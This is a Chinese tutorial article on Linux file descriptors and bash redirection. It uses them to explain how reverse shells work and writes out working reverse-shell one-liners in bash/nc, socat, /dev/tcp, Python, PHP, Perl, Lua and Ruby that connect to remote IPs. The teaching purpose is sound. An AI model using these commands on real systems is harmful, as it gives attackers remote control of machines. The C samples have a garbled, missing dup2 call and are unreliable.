原创 4ct10n 合天智汇

## 0x01 文件描述符介绍  

Linux
系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。这个操作包含各种文件的读写，程序的输入输出等。

## 0x1 文件与文件描述符  

文件描述符最终对应的是文件，文件包含多种类型文件又可分为：普通文件、目录文件、链接文件和设备文件。程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。POSIX标准要求每次打开文件时（含socket）必须使用当前进程中最小可用的文件描述符号码.

## 0x2 相互关系  

>
> 其中进程，文件，文件描述符的关系如下：一个进程可以有多个文件描述符一个文件可以由多个文件描述符对应，文件描述符可以是不同进程一个文件描述符只能对应一个文件  
>

具体关系图如下

![v2-26e07f59de61dcd99d567a60168bc4cb_b.jp](https://pic4.zhimg.com/v2-26e07f59de61dcd99d567a60168bc4cb_b.jpg)

文件描述符映射到文件

第一列是用户态进程符号描述表，后两列是内核态系统级表项。具体从文件描述符到文件，先从文件描述符表开始索引，定位到文件句柄指针，接着找到打开文件表，存储着文件的状态，包括偏移，inode号等，不同的文件描述符可以指向相同的文件句柄指针（可用dup或dup2函数实现）。

## 0x3 操作指令  

lsof

lsof是列出系统所占用的资源（list open files），其中包括句柄资源。

lsof -a -p pid -d0,1,2,3#查看进程的文件描述符 lsof -w -n #查看所有使用的文件

ulimit

ulimit主要是用来限制进程对资源的使用情况的，它支持各种类型的限制，包括打开文件句柄数限制。

ulimit -n #查看进程允许打开的最大文件句柄数 ulimit -n pid#设置进程能打开的最大文件句柄数

看完了内容，做个实验放松一下：Web操作系统基础-Linux

[课程:Web操作系统基础-Linux(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=C9d6c0ca797abec2017041916323500001)

![v2-c187acc5bb791cec1205468902b18ee7_b.jp](https://pic4.zhimg.com/v2-c187acc5bb791cec1205468902b18ee7_b.jpg)

0x02 Shell中的文件描述符

在shell中使用的文件描述符总共有三种只读，只写，读写，参见下图：

![v2-26b4ad90e398d4090d201966dad4680e_b.jp](https://pic3.zhimg.com/v2-26b4ad90e398d4090d201966dad4680e_b.jpg)

文件描述符种类

在FD一列分别是u,w,r，其中u代表可读可写,一般来讲>代表写，<代表读
在shell中所有的文件描述符都是要被继承的，因为shell中执行命令其实是在子进程中执行命令，子进程会继承父进程所有的环境变量，文件描述符等。

## 0x1 bash重定向  

命令echo "asd" > hellocat - < helloecho "asd" > hello 2>&1

echo "asd" > hello 将标准输出重定向到文件，这样命令执行的结果会全部写在hello文件中。此命令等价于echo "asd">&hello

cat - < hello 将标准输入重定向到文件，cat - 意思是接受标准输入为文件进行输出，此命令等价于以下几个命令 cat hello | cat
-exec 0<hello;cat - 第一种只是多此一举，单纯的为了演示cat -的其他使用方法，该命令成功的原因在于管道符|
将管道符之后的命令的标准输入设置成了前一个指令的标准输出。第二种首先修改程序标准输入对应的文件为hello文件，其次执行cat
-就会从标准输入中读取这是的标准输入文件已经成为了hello文件。

echo "asd" > hello 2>&1
,主要是2>&1这个在下面的exec指令中会经常遇到，首先>&是赋值后者描述符的输出属性，<&是赋值后者描述符的输入属性。

复制下方链接或者点击阅读原文体验：

初识bash之一：

[实验:初识bash之一(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014091814123800001)

初识bash之二：

[实验:初识bash之二(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014091814135100001)

## 0x2 exec  

![v2-2ca1a00938198d31e148f0d62006e70d_b.jp](https://pic2.zhimg.com/v2-2ca1a00938198d31e148f0d62006e70d_b.jpg)

exec 3<>hello，将该shell的3号描述符制定到hello文件上并设置可读可写属性

![v2-86dd68882ff26ed9533ee094ac0eb9eb_b.jp](https://pic4.zhimg.com/v2-86dd68882ff26ed9533ee094ac0eb9eb_b.jpg)

命令执行图

exec 3>hello ，exec 3<hello分别以输出和输入的方式重定向文件描述符3对应的文件

![v2-5c61313e678fcfd47b448efeb0e6f688_b.jp](https://pic1.zhimg.com/v2-5c61313e678fcfd47b448efeb0e6f688_b.jpg)

输出重定向

![v2-9a2b2f90794d29e86a4a49fc7af3e57f_b.jp](https://pic4.zhimg.com/v2-9a2b2f90794d29e86a4a49fc7af3e57f_b.jpg)

输入重定向

exec 3>&2 复制文件描述符2对应的文件到3描述符并赋予写属性 exec 3<&1 复制文件描述符1对应的文件到3描述符并赋予读属性

exec 3>&\- 关闭文件描述符

![v2-e3d6cb0cccee35c707450912867c0651_b.jp](https://pic2.zhimg.com/v2-e3d6cb0cccee35c707450912867c0651_b.jpg)

关闭文件描述符

exec 0<hello 将0文件描述符的文件重定向到hello文件上

![v2-662c***84dd5104437b55bc755709765_b.jp](https://pic2.zhimg.com/v2-662c***84dd5104437b55bc755709765_b.jpg)

不过此时在当前shell中仍然可以输入，原因是shell的输入是直接从键盘获取的，0号描述符只是影响了shell中启动的子进程。

比如cat - 会直接从标准输入中获取内容。

## 0x3 socket 套接字与描述符  

在bash中利用socket可以实现很多功能，包括反弹shell，接受文件等。

mknod /tmp/backpipe p/bin/sh 0</tmp/backpipe | nc 192.168.xx.xx 4430
1>/tmp/backpipe

![v2-c1371f307178343c12d308c567016a1b_b.jp](https://pic4.zhimg.com/v2-c1371f307178343c12d308c567016a1b_b.jpg)

nc-socket文件描述符

主机一二之间利用socket套接字连接，文件描述符3代表新创建的socket套接字，管道符|使得/bin/bash的输出成为了nc的输入，同时nc将输出重定向到了pipe文件与/bin/bash的输入同一文件，具体关系如下

![v2-4affa7b7bcc7095813c8e6acde1c889e_b.jp](https://pic3.zhimg.com/v2-4affa7b7bcc7095813c8e6acde1c889e_b.jpg)

socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:192.168.0.119:9999

![v2-84ba004246eeb51d09a7374f15de239d_b.jp](https://pic2.zhimg.com/v2-84ba004246eeb51d09a7374f15de239d_b.jpg)

socat-socket文件描述符

exec 22<>/dev/tcp/192.168.0.119/4444 sh <&22 >&22 2>&22

该方法先把socket套接字保存为文件描述符，再将子进程sh的所有文件描述符重定向到socket文件描述上

![v2-5c6739e578d5551280db4d3b65b78d71_b.jp](https://pic2.zhimg.com/v2-5c6739e578d5551280db4d3b65b78d71_b.jpg)

## 0x03 程序中的文件描述符利用  

在程序中文件描述符和管道可以用于进程通信等，同时在反弹shell方面有着较好的实用性。从多个语言的不同功能描述管道与文件描述符在实际使用中的作用。包含C、python、php、perl、Ruby、Lua多种语言在内的测试代码以及结果。

函数功能dup(a)复制文件描述符a所关联的文件dup2(a,b)将a的赋值给b

## 0x1 c语言  

利用管道及文件描述符实现进程间的通信,

#include "stdio.h" #include "unistd.h" #include "sys/types.h" #include
"fcntl.h" int main() { char buffer[1024] = {0}; int len; int status; int
pid,fd; fd = open("data.in",O_WRONLY); /* fork to execute external program or
scripts */ pid = fork(); if (pid==0) { /* child process */ (fd,
STDOUT_FILENO); char *cmd[] = { "bash","-c","echo '111'",NULL }; /* execute
CGI */ execv("/bin/bash",cmd); exit(0); } else { waitpid((pid_t)pid, &status,
0); } }

代码创建了一对管道如图所示：

![v2-10c22f216acdcb92864dff0c127b28d5_b.jp](https://pic2.zhimg.com/v2-10c22f216acdcb92864dff0c127b28d5_b.jpg)

fork过后，父子进程都连接pipe的读写端，与shell一样0，1描述符都是代表读写，对象是描述符文件，从描述符文件中读，写到描述符文件中。同时要关闭不必要的文件描述符读写端各保留一个。

![v2-812d713bcb8a30b80c2d420716a65a67_b.jp](https://pic4.zhimg.com/v2-812d713bcb8a30b80c2d420716a65a67_b.jpg)

fork pipe示意图

该示例把子进程输出重定向到文件，代码及解释如下：

#include "stdio.h"#include "unistd.h"#include "sys/types.h"#include
"fcntl.h"int main() { char buffer[1024] = {0}; int len; int status; int
pid,fd; fd = open("data.in",O_WRONLY); /* fork to execute external program or
scripts */ pid = fork(); if (pid==0) { /* child process */ (fd,
STDOUT_FILENO); char *cmd[] = { "bash","-c","echo '111'",NULL }; /* execute
CGI */ execv("/bin/bash",cmd); exit(0); } else { waitpid((pid_t)pid, &status,
0); }}

![v2-ff8cd01d48a522a7ecb5ec93f612bb06_b.jp](https://pic3.zhimg.com/v2-ff8cd01d48a522a7ecb5ec93f612bb06_b.jpg)

代码15行dup2(a,b)函数将a的描述符文件赋值给b，可以把子进程的执行结果在文件中保存。

## 0x2 python  

#!/usr/bin/env python # coding=utf-8 import os,sys aaa =
os.open("./data.out",os.O_WRONLY) pid = os.fork() if pid ==0 : os.dup2(aaa,1)
cmd = ["/bin/bash","-c","echo 'aaaa'"] os.execv(cmd[0],cmd)

利用python代码实现了c语言版子进程命令执行结果保存到文件。

python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",5555));os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

创建socket套接字，并将0，1，2描述符重定向到套接字上，执行subprocess继承当前进程的文件描述符状态，将bash的输入输出与套接字绑定实现反弹。

## 0x3  

phpphp -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

![v2-845e688ef1d7f1798878f64e4a59409d_b.jp](https://pic2.zhimg.com/v2-845e688ef1d7f1798878f64e4a59409d_b.jpg)

php代码对应的文件描述符

根据文件描述符都是递增的道理，创建新的文件描述符之后其大小应该为3，所以直接将0，1，2重定向到了3，就完成了把bash的输入输出和socket绑定操作。

## 0x4 perl  

perl -e 'use
Socket;$i="x.x.x.x";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
-i");};'

![v2-f59bfe44bfce706d0a32e18b20021196_b.jp](https://pic3.zhimg.com/v2-f59bfe44bfce706d0a32e18b20021196_b.jpg)

perl代码 子程序 文件描述符

在perl代码中，重定向函数为open，open(STDOUT,
">file1")翻译为将替换STDOUT指向的文件为file1；open(STDIN,">&S")翻译为替换STDIN指向的文件为S指向的文件。

## 0x5 lua  

lua -e
"require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh
-i <&3 >&3 2>&3');"

![v2-1e1e7f32e10e876dda00e10fc84349d5_b.jp](https://pic2.zhimg.com/v2-1e1e7f32e10e876dda00e10fc84349d5_b.jpg)

lua 代码文件描述符

和php类似的现象，文件描述符编号递增，接着把bash输入输出重定向到socket

## 0x6 ruby  

ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh
-i <&%d >&%d 2>&%d",f,f,f)'

同上php和lua的重定向原理

ruby -rsocket -e 'exit if
fork;c=TCPSocket.new("192.168.0.115","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print
io.read}end'

![v2-7ca1a35d64576dec21fe6d2296f18f9e_b.jp](https://pic3.zhimg.com/v2-7ca1a35d64576dec21fe6d2296f18f9e_b.jpg)

ruby代码文件描述符

脱离了系统自带的bash，将socket和程序cmd IO绑定起来，利用|实现重定向。

## 0x04 总结  

从基础shell的文件描述符到程序中的文件描述符。可以总结几个比较重要的点

  1. 文件描述符在用户态，同时在系统中会对应一个文件  

  2. 文件描述符对应的文件可以有多种类型，pipe，文件，终端等  

  3. 0，1，2是程序默认的输入，输出，错误输出，新的文件描述符号会递增  

  4. 子进程会继承所有父进程的文件描述符状态  

  5. 文件描述符有很多赋值操作例如exec ,>&, <&,>,<  

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

